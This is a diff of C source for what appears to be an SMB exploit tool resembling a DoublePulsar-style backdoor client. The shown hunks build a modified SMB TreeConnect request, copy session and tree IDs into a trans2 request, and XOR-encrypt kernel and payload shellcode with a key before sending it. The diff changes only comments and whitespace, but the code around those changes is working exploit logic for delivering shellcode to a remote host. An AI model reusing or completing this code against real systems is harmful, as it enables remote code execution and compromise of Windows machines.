@@ -237,14 +237,14 @@ int main(int argc, char* argv[])
 	memcpy(packet + 3, &smblen, 1);
 
 	//update UserID in modified TreeConnect Request
-	memcpy(packet + 0x20, (unsigned char*)&userid, 2); //update userid in packet
+	memcpy(packet + 0x20, (unsigned char*)&userid, 2);
 
 	//send modified SMB TreeConnect request
 	send(sock, (char*)packet, ptr - packet, 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
 	//copy the treeID from the TreeConnect response
-	treeid = *(WORD*)(recvbuff + 0x1c);       //get treeid
+	treeid = *(WORD*)(recvbuff + 0x1c);
 
 	//Update treeID, UserID in the trans2 request
 	memcpy(trans2_request + 28, (unsigned char*)&treeid, 2);
@@ -386,7 +386,6 @@ int main(int argc, char* argv[])
 
 	//hexDump(NULL, hMem, shellcode_one_part_len + 4);
 
-
 	//might need to make this static due to sizeof being garbage @ counting shellcode
 	//unsigned int kernel_shellcode_size = sizeof(kernel_shellcode) / sizeof(kernel_shellcode[0]);
 	//unsigned int payload_shellcode_size = sizeof(shellcode) / sizeof(shellcode[0]);
@@ -416,6 +415,7 @@ int main(int argc, char* argv[])
 	byte_xor_key[2] = (unsigned char)(((unsigned int)XorKey >> 16) & 0xFF);
 	byte_xor_key[3] = (unsigned char)(((unsigned int)XorKey >> 24) & 0xFF);
 
+	//XOR the parameters with the XOR key
 	int i;
 	for (i = 0; i < 13; i++)
 	{
@@ -452,6 +452,7 @@ int main(int argc, char* argv[])
 
 	//hexDump(NULL, encrypted, kernel_shellcode_size + 2 + payload_shellcode_size);
 
+	//XOR the payload with the XOR key
 	for (i = 0; i < 4096; i++)
 	{
 		encrypted[i] ^= byte_xor_key[i % 4];
